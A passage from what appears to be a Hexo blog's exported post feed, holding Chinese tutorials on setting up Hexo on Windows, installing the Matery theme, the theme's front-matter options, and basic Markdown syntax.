aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>至此，就可以打开浏览器输入域名就可以访问到Hexo部署在阿里云上的博客了。</p><hr><p>参考文献:</p><p><code>[1]:https://fuchenchenle.cn/2020/08/18/hexo%E9%83%A8%E7%BD%B2%E8%85%BE%E8%AE%AF%E4%BA%91/#Fuchenchenle</code></p><p><code>[2]:https://quefeixi.com/archives/18.html</code></p><p><code>[3]:https://developer.aliyun.com/article/764438</code></p>]]></content>
      
      
      <categories>
          
          <category> Hexo博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【hexo博客搭建】本地搭建hexo博客(上)</title>
      <link href="/2022/015e4a5926.html"/>
      <url>/2022/015e4a5926.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇文章会从本地(Windows 10)搭建-主题更换-部署阿里云详细步骤，如果在搭建过程中，遇到问题，可以通过博客页脚下的QQ联系我，或者在下面评论留言</p><h2 id="一-本地搭建"><a href="#一-本地搭建" class="headerlink" title="一.本地搭建"></a>一.本地搭建</h2><h3 id="1-安装前置"><a href="#1-安装前置" class="headerlink" title="1.安装前置"></a>1.安装前置</h3><h4 id="1-1安装git"><a href="#1-1安装git" class="headerlink" title="1.1安装git"></a>1.1安装git</h4><p>在<a href="https://git-scm.com/download/win">git官网</a>下载最新版本的git即可，因为本地是Windows所以下载Windows版本即可，如下图所示，如果你是x64版本的电脑就下载红色箭头所指的版本，如果你是x32的就下载x32版本的。</p><p>下载完毕安装包之后全部next下一步即可</p><p><img src="/images/wordimage/gitsetup.png" alt="Windows安装git"></p><hr><h4 id="1-2安装node-js"><a href="#1-2安装node-js" class="headerlink" title="1.2安装node.js"></a>1.2安装node.js</h4><p>安装hexo博客需要nodejs的支持，需要去<a href="https://nodejs.org/en/">nodejs</a>官网下载，下载LTS长期支持版本即可，如下图<br><strong>我这里的版本是16.13.2LTS</strong></p><p><img src="/images/wordimage/nodejs.png" alt="nodejs官网"></p><p>下载完毕之后，直接按照自己需求设置即可，或者直接全部下一步，安装完毕之后，检测安装成功输入如下命令,就可以查看node版本，然后里面还带有npm包管理器也是如下命令查看版本</p><p>Windows的建议是，使用cmd用管理员的方式启动<br>使用windows键 + q输入cmd，鼠标右键以管理员的方式启动</p><p><em><strong>node查看版本</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">node</span> -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em><strong>npm查看版本</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图所示,显示nod版本为<strong>v16. 13 .2</strong>，npm版本为<strong>8. 1. 2</strong></p><p><img src="/images/wordimage/nodejs_npm.png" alt="node版本"></p><hr><h4 id="1-3npm换淘宝源"><a href="#1-3npm换淘宝源" class="headerlink" title="1.3npm换淘宝源"></a>1.3npm换淘宝源</h4><p>换淘宝源的原因是npm在国外下载速度很卡，淘宝源是国内的就不卡,使用npm下载cnpm来实现换源。</p><p><em><strong>npm下载cnpm命令如下</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -g cnpm --registry<span class="token operator">=</span>https://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入这个命令之后，如下图，第一个红色箭头是安装命令，安装可能会稍微有点久，第二个红色箭头是检查是否安装成功，如果和我显示的一样，没有ERR的报错那么就是安装成功了。</p><p><img src="/images/wordimage/cnpmanzhuang.png" alt="cnpm的安装"></p><hr><h4 id="1-4使用cnpm安装hexo博客框架"><a href="#1-4使用cnpm安装hexo博客框架" class="headerlink" title="1.4使用cnpm安装hexo博客框架"></a>1.4使用cnpm安装hexo博客框架</h4><p>到这里已经完全安装完毕前置，就可以正式开始安装hexo博客框架，输入如下命令来安装hexo博客框架。</p><p><em><strong>安装博客框架命令</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cnpm <span class="token function">install</span> -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入完如上命令之后如下图，第一个红色箭头是上面的安装博客框架命令，第二个红色箭头是检查是否安装成功，如果你和我一样，那么就是安装成功了。</p><p><img src="/images/wordimage/hexobokekuangjia.png" alt="成功安装hexo博客框架"></p><hr><h3 id="2-生成hexo博客"><a href="#2-生成hexo博客" class="headerlink" title="2.生成hexo博客"></a>2.生成hexo博客</h3><h4 id="2-1准备文件夹"><a href="#2-1准备文件夹" class="headerlink" title="2.1准备文件夹"></a>2.1准备文件夹</h4><p>到这里就能真正的安装hexo博客了，首先需要准备一个文件夹比如我这里准备的是<em>blog</em>文件夹来放我的hexo博客，输入命令如下。</p><p><em><strong>准备blog文件夹</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>md blog<span class="token builtin class-name">cd</span> blog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如下图所示按照从上往下的顺序，第一个箭头是回到上级目录，第二个箭头也是回到上级目录，第三个箭头是创建<em>blog</em>文件夹第四个箭头是进入blog文件夹(是不是写的太详细，废话太多了？)</p><p><img src="/images/wordimage/mdblog.png" alt="创建文件夹"></p><p>上图是因为我使用的是虚拟机操作，只有一个C盘，所以只能在C盘下操作，这里我选择的是在C盘根目录下面创建<em>blog</em>文件，如果你是真实机，电脑里面应该有D盘F盘等等…什么盘，如果你要在其他盘创建可以输入如下命令</p><p><em><strong>其他盘创建文件夹命令</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> 盘符:                 <span class="token comment">#比如 D:</span><span class="token operator">></span> md <span class="token variable"><span class="token variable">`</span>你要创建的文件夹<span class="token variable">`</span></span>  <span class="token comment">#比如 md blog</span><span class="token operator">></span> <span class="token builtin class-name">cd</span> <span class="token variable"><span class="token variable">`</span>你创建的文件夹<span class="token variable">`</span></span>    <span class="token comment">#比如 cd blog</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h4 id="2-2生成hexo博客文件"><a href="#2-2生成hexo博客文件" class="headerlink" title="2.2生成hexo博客文件"></a>2.2生成hexo博客文件</h4><p>在上面操作的<em>blog</em>文件目录下操作，cmd最好是管理员的方式运行，输入如下命令即可在blog文件夹下面生成hexo博客文件。</p><p><em><strong>生成hexo博客文件</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为各种原因，没有在C盘操作了，比如权限问题，下面我都是在虚拟机的E盘操作</p><p>然后我遇到了一个问题在这里记录一下，如果你在这个步骤和我遇到了一样的问题也可以参考我的解决办法。如下图报错。</p><p><img src="/images/wordimage/errmeiquanxian.png" alt="输入hexo init报错"></p><p>解决办法是找到nodejs的安装目录，右键属性，点击安全，设置users用户完全控制权限</p><p>输入完成生成命令之后，可以在生成的目录下面看见这些文件，如下图，后门做博客全部都是基于如下图的文件来修修改改</p><p><img src="/images/wordimage/hexofile.png" alt="生成的文件"></p><hr><h4 id="2-3启动hexo博客"><a href="#2-3启动hexo博客" class="headerlink" title="2.3启动hexo博客"></a>2.3启动hexo博客</h4><p>现在什么都做完了，就差启动了，输入如下命令即可启动，前提是必须是在你生成hexo博客的文件夹下面输入如下命令</p><p><em><strong>启动hexo博客</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入完成这个命令之后你应该能看见如下图所示的样子</p><p><img src="/images/wordimage/hexoblogsucc.png" alt="hexo博客启动成功"></p><p>然后就可以根据地址到浏览器去访问,<a href="http://localhost:4000/,%E5%A6%82%E4%B8%8B%E5%9B%BE%EF%BC%8C%E6%88%90%E5%8A%9F%E7%94%BB%E9%9D%A2%E3%80%82">http://localhost:4000/,如下图，成功画面。</a></p><p><img src="/images/wordimage/hexosucc.png" alt="成功访问hexo博客"></p><p>我就在这里简单说下hexo的命令用法</p><p><em><strong>启动服务</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em><strong>删除缓存</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo clean<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em><strong>重构文件</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em><strong>部署到远程站点</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这个页面上面，也详细说明了，怎么创建文章，启动服务，到此，一个基础的hexo博客就已经搭建完毕。</p><hr><h2 id="二-更换主题"><a href="#二-更换主题" class="headerlink" title="二.更换主题"></a>二.更换主题</h2><p>官方给的主题不太好看怎么办，换主题呗！这里我以Matery主题来做演示，当然你现在看见的这个博客就是用Matery主题来修改的。</p><h3 id="1-下载主题"><a href="#1-下载主题" class="headerlink" title="1.下载主题"></a>1.下载主题</h3><p><a href="https://gitee.com/jingxiang25/hexo-theme-matery">Matery官方文档</a>当然你也可以去官方文档查看，里面有如何修改，配置，当然大多数还是需要自己去修改。</p><p>在你的hexo目录下面有一个themes文件夹，cd进去，然后下载matery主题，命令如下</p><p><em><strong>安装matery主题</strong></em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，如果你和我一样那么就是下载成功了,从上往下，我们先看第二个箭头，第二个箭头是安装matery主题命令，然后下载完毕之后，把themes文件夹里面的主题名字改为<em>matery</em>原名是<em>hexo-theme-matery</em>，这样的好处是方便操作</p><p><img src="/images/wordimage/matery.png" alt="主题下载完毕"></p><hr><h4 id="1-1安装主题"><a href="#1-1安装主题" class="headerlink" title="1.1安装主题"></a>1.1安装主题</h4><p>下载完毕之后还需要做配置文件的修改才能生效，首先我们打开hexo博客目录下的<em>_config.yml</em>文件，如下图，从左往右，打开第一个红色箭头所指的<em>_config.yml</em>文件然后，右边的红色箭头是打开文件过后的样子，找到底部theme选项，然后把原本的值修改成<em>matery</em></p><p><img src="/images/wordimage/xiugaizhuti.png" alt="修改配置文件"></p><p>如下图查看效果，发现就变好康了很多🎈，这里查看的时候，先<a href="#code">ctrl+c</a>停止运行，然后输入<a href="#code">hexo clean</a>清理缓存，在然后输入<a href="#code">hexo g</a>重构，最后输入<a href="#code">hexo s</a>运行服务即可</p><p><img src="/images/wordimage/materyok.png" alt="Matery主题安装完毕"></p><p>下一篇文章将是把本地博客部署到阿里云服务器上面</p>]]></content>
      
      
      <categories>
          
          <category> Hexo博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Matery主题 </tag>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录创建博客文章所需</title>
      <link href="/2022/018cf1e4d9.html"/>
      <url>/2022/018cf1e4d9.html</url>
      
        <content type="html"><![CDATA[<p>2025年2月5日重新更新</p><p>搬运文章：<a href="https://blog.csdn.net/howareyou2104/article/details/106312703">如何用Hexo优雅的书写文章_hexo首行缩进-CSDN博客</a></p><table><thead><tr><th>配置选项</th><th>默认值</th><th align="center">描述</th></tr></thead><tbody><tr><td>title</td><td>Markdown 的文件标题</td><td align="center">文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td align="center">发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 author</td><td align="center">文章作者</td></tr><tr><td>img</td><td>featureImages 中的某个值</td><td align="center">文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <a href="http://xxx.com/xxx.jpg">http://xxx.com/xxx.jpg</a></td></tr><tr><td>top</td><td>true</td><td align="center">推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章</td></tr><tr><td>cover</td><td>false</td><td align="center">v1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td align="center">v1.0.2版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td align="center">文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项</td></tr><tr><td>toc</td><td>true</td><td align="center">是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项</td></tr><tr><td>mathjax</td><td>false</td><td align="center">是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td align="center">文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td align="center">文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td align="center">文章标签，一篇文章可以多个标签</td></tr><tr><td>keywords</td><td>文章标题</td><td align="center">文章关键字，SEO 时需要</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td align="center">文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><br><pre class="line-numbers language-none"><code class="language-none">---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00author: 赵奇img: &#x2F;source&#x2F;images&#x2F;xxx.jpgtop: truecover: truecoverImg: &#x2F;images&#x2F;1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只搬运了我自己常用的，剩下的可以去看原文章</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Matery主题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown基础语法(上)</title>
      <link href="/2022/01c8efa162.html"/>
      <url>/2022/01c8efa162.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>按照官方文档，和根据自己所用和所理解所写</p><h3 id="一-标题语法"><a href="#一-标题语法" class="headerlink" title="一.标题语法"></a>一.标题语法</h3><p>一级标题最大，六级标题最小</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token title important"><span class="token punctuation">#</span> 一级标题</span><span class="token title important"><span class="token punctuation">##</span> 二级标题</span><span class="token title important"><span class="token punctuation">###</span> 三级标题</span><span class="token title important"><span class="token punctuation">####</span> 四级标题</span><span class="token title important"><span class="token punctuation">#####</span> 五级标题</span><span class="token title important"><span class="token punctuation">######</span> 六级标题</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二-段落语法"><a href="#二-段落语法" class="headerlink" title="二.段落语法"></a>二.段落语法</h3><p>一个回车一个段落</p><p>我是真的喜欢你</p><p>不，你是个好人。</p><h3 id="三-换行语法"><a href="#三-换行语法" class="headerlink" title="三.换行语法"></a>三.换行语法</h3><p>在一行的末尾添加两个或者多个空格然后回车就可以创建一个换行<br>官方说的是还是直接回车键实现换行。我在换行的地方输入了 br<br>可以对比段落语法和换行语法一行的间距区别，还是很明显的。</p><p>这是第一行<br>这是第二行</p><h3 id="四-强调语法"><a href="#四-强调语法" class="headerlink" title="四.强调语法"></a>四.强调语法</h3><p>如果要加粗文本在单词或者短语前后加上<br>加上两个**即可，或者两个下划线</p><p>正常字体</p><h4 id="1-粗体"><a href="#1-粗体" class="headerlink" title="1.粗体"></a>1.粗体</h4><p><strong>加粗</strong></p><p>但是我的建议是使用**来实现加粗</p><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token bold"><span class="token punctuation">**</span><span class="token content">加粗</span><span class="token punctuation">**</span></span><span class="token bold"><span class="token punctuation">**</span><span class="token content">加粗</span><span class="token punctuation">**</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第二种语法在长句无效</p><h4 id="2-倾斜"><a href="#2-倾斜" class="headerlink" title="2.倾斜"></a>2.倾斜</h4><p><em>倾斜</em></p><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token italic"><span class="token punctuation">_</span><span class="token content">倾斜</span><span class="token punctuation">_</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-斜体加粗"><a href="#3-斜体加粗" class="headerlink" title="3.斜体加粗"></a>3.斜体加粗</h4><p><strong><em>斜体加粗</em></strong></p><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token bold"><span class="token punctuation">**</span><span class="token content"><span class="token italic"><span class="token punctuation">_</span><span class="token content">斜体加粗</span><span class="token punctuation">_</span></span></span><span class="token punctuation">**</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="五-引用语法"><a href="#五-引用语法" class="headerlink" title="五.引用语法"></a>五.引用语法</h3><h4 id="1-单个引用"><a href="#1-单个引用" class="headerlink" title="1.单个引用"></a>1.单个引用</h4><p>如果要创建引用在段落前面加上”&gt;”</p><blockquote><p>I really like you</p></blockquote><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token blockquote punctuation">></span> I really like you<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-多个引用"><a href="#2-多个引用" class="headerlink" title="2.多个引用"></a>2.多个引用</h4><blockquote><p>Do you like rain?</p><p>yes</p></blockquote><p> 渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token blockquote punctuation">></span> Do you like rain<span class="token blockquote punctuation">></span><span class="token blockquote punctuation">></span> yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-多层引用"><a href="#3-多层引用" class="headerlink" title="3.多层引用"></a>3.多层引用</h4><blockquote><p>一二三四五</p><blockquote><p>六七八九十</p><blockquote><p>十一十二十三</p><blockquote><p>十四十五</p><blockquote><p>十六十七</p><blockquote><p>十八十九</p></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token blockquote punctuation">></span> 一二三四五<span class="token blockquote punctuation">></span><span class="token blockquote punctuation">> ></span> 六七八九十<span class="token blockquote punctuation">> ></span><span class="token blockquote punctuation">> > ></span> 十一十二十三<span class="token blockquote punctuation">> > ></span><span class="token blockquote punctuation">> > > ></span> 十四十五<span class="token blockquote punctuation">> > > ></span><span class="token blockquote punctuation">> > > > ></span> 十六十七<span class="token blockquote punctuation">> > > > ></span><span class="token blockquote punctuation">> > > > > ></span> 十八十九<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-带有其他元素的块引用"><a href="#4-带有其他元素的块引用" class="headerlink" title="4.带有其他元素的块引用"></a>4.带有其他元素的块引用</h4><blockquote><p>四级标题</p><ul><li><p>测试 1</p></li><li><p>测试 2</p><p><em>测试</em> 测试 <strong>测试</strong></p></li></ul></blockquote><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token blockquote punctuation">></span> 四级标题<span class="token blockquote punctuation">></span><span class="token blockquote punctuation">></span> <span class="token list punctuation">-</span> 测试 1<span class="token blockquote punctuation">></span> <span class="token list punctuation">-</span> 测试 2<span class="token blockquote punctuation">></span><span class="token blockquote punctuation">></span>   <span class="token italic"><span class="token punctuation">_</span><span class="token content">测试</span><span class="token punctuation">_</span></span> 测试 <span class="token bold"><span class="token punctuation">**</span><span class="token content">测试</span><span class="token punctuation">**</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="六-列表语法"><a href="#六-列表语法" class="headerlink" title="六.列表语法"></a>六.列表语法</h3><h4 id="1-有序列表"><a href="#1-有序列表" class="headerlink" title="1.有序列表"></a>1.有序列表</h4><p>需要注意的是“.”的后面有一个空格</p><ol><li>第一个</li><li>第二个</li><li>第三个</li><li>第四个</li></ol><p>渲染代码如下</p><pre class="line-numbers language-mark" data-language="mark"><code class="language-mark">1. 第一个2. 第二个3. 第三个4. 第四个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li>第一个</li><li>第二个</li><li>第三个<ol><li>第三点一个</li><li>第三点二个</li></ol></li><li>第四个</li></ol><p>渲染代码如下</p><pre class="line-numbers language-mark" data-language="mark"><code class="language-mark">1. 第一个2. 第二个3. 第三个   1. 第三点一个   2. 第三点二个4. 第四个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-无序列表"><a href="#2-无序列表" class="headerlink" title="2.无序列表"></a>2.无序列表</h4><p>和上面的有序列表差不多都有空格</p><ul><li>第一个</li><li>第二个</li><li>第三个</li><li>第四个</li></ul><p>渲染代码如下</p><pre class="line-numbers language-mark" data-language="mark"><code class="language-mark">- 第一个- 第二个- 第三个- 第四个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>另外一种方法，一样的效果</p><ul><li>第一个</li><li>第二个</li><li>第三个</li><li>第四个</li></ul><p>渲染代码如下</p><pre class="line-numbers language-mark" data-language="mark"><code class="language-mark">* 第一个* 第二个* 第三个* 第四个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>层级</p><ul><li>第一个</li><li>第二个</li><li>第三个<ul><li>第一个</li><li>第二个</li><li>第三个</li></ul></li><li>第四个</li></ul><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token list punctuation">-</span> 第一个<span class="token list punctuation">-</span> 第二个<span class="token list punctuation">-</span> 第三个  <span class="token list punctuation">-</span> 第一个  <span class="token list punctuation">-</span> 第二个  <span class="token list punctuation">-</span> 第三个<span class="token list punctuation">-</span> 第四个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-在列表中套用其他元素"><a href="#3-在列表中套用其他元素" class="headerlink" title="3.在列表中套用其他元素"></a>3.在列表中套用其他元素</h4><h5 id="3-1段落"><a href="#3-1段落" class="headerlink" title="3.1段落"></a>3.1段落</h5><ul><li><p>第一个</p></li><li><p>第二个</p><p>我是第三个</p></li><li><p>第四个</p></li></ul><p>渲染代码如下</p><pre class="line-numbers language-mark" data-language="mark"><code class="language-mark">- 第一个- 第二个  我是第三个- 第四个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-2引用"><a href="#3-2引用" class="headerlink" title="3.2引用"></a>3.2引用</h5><ul><li><p>第一个</p></li><li><p>第二个</p><blockquote><p>我是第三个</p></blockquote></li><li><p>第四个</p></li></ul><p>渲染代码如下</p><pre class="line-numbers language-mark" data-language="mark"><code class="language-mark">- 第一个- 第二个  &gt; 我是第三个- 第四个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-3代码块"><a href="#3-3代码块" class="headerlink" title="3.3代码块"></a>3.3代码块</h5><ol><li><p>第一个</p></li><li><p>第二个</p><html>    <head>        <title>测试</title>    </head></html></li><li><p>第三个</p></li></ol><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token list punctuation">1.</span> 第一个<span class="token list punctuation">2.</span> 第二个   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>测试<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token list punctuation">3.</span> 第三个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-4列表"><a href="#3-4列表" class="headerlink" title="3.4列表"></a>3.4列表</h5><ol><li>第一个</li><li>第二个<ul><li>第一个</li><li>第二个</li></ul></li><li>第三个</li></ol><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token list punctuation">1.</span> 第一个<span class="token list punctuation">2.</span> 第二个   <span class="token list punctuation">-</span> 第一个   <span class="token list punctuation">-</span> 第二个<span class="token list punctuation">3.</span> 第三个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="七-代码语法"><a href="#七-代码语法" class="headerlink" title="七.代码语法"></a>七.代码语法</h3><p>如果要把单词或者短语表示为代码就用`包裹代码</p><p><code>print</code>是 python 的输出语句</p><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token code-snippet code keyword">`print`</span>是 python 的输出语句<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-转义符"><a href="#1-转义符" class="headerlink" title="1.转义符"></a>1.转义符</h4><p>如果需要展现出`符号，请在单词或者短语用``包裹</p><p><code>Markdown代码表示单词语法是`print`是对的</code></p><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token code-snippet code keyword">`` Markdown代码表示单词语法是`print`是对的 ``</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="八-分割线语法"><a href="#八-分割线语法" class="headerlink" title="八.分割线语法"></a>八.分割线语法</h3><p>如果要使用分割线，在单独一行使用三个或者多个***或者—或者___</p><p>并且不能包含其他内容</p><hr><hr><hr><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token front-matter-block"><span class="token punctuation">---</span><span class="token punctuation">---</span></span><span class="token hr punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>为了兼容性在分割线前后加上空白行</p><h3 id="九-链接语法"><a href="#九-链接语法" class="headerlink" title="九.链接语法"></a>九.链接语法</h3><p>这是一个链接<a href="https://blog.takagisan.top/">Ken 的博客</a></p><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">这是一个链接<span class="token url">[<span class="token content">Ken 的博客</span>](<span class="token url">https://blog.takagisan.top</span>)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-给链接增加-title"><a href="#1-给链接增加-title" class="headerlink" title="1.给链接增加 title"></a>1.给链接增加 title</h4><p>这是一个链接<a href="https://blog.takagisan.top/" title="Ken的博客">Ken 的博客</a></p><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">这是一个链接<span class="token url">[<span class="token content">Ken 的博客</span>](<span class="token url">https://blog.takagisan.top</span> <span class="token string">"Ken的博客"</span>)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-网址和-email-地址"><a href="#2-网址和-email-地址" class="headerlink" title="2.网址和 email 地址"></a>2.网址和 email 地址</h4><p>使用尖括号即可方便把 URL 或者 email 地址变成可点击的链接。</p><p><a href="https://blog.takagisan.top/">https://blog.takagisan.top</a></p><p><a href="mailto:&#x32;&#x31;&#50;&#53;&#55;&#x36;&#48;&#x32;&#55;&#48;&#64;&#x71;&#113;&#x2e;&#x63;&#111;&#x6d;">&#x32;&#x31;&#50;&#53;&#55;&#x36;&#48;&#x32;&#55;&#48;&#64;&#x71;&#113;&#x2e;&#x63;&#111;&#x6d;</a></p><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">&lt;https://blog.takagisan.top>&lt;2125760270@qq.com><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-带格式化的链接"><a href="#3-带格式化的链接" 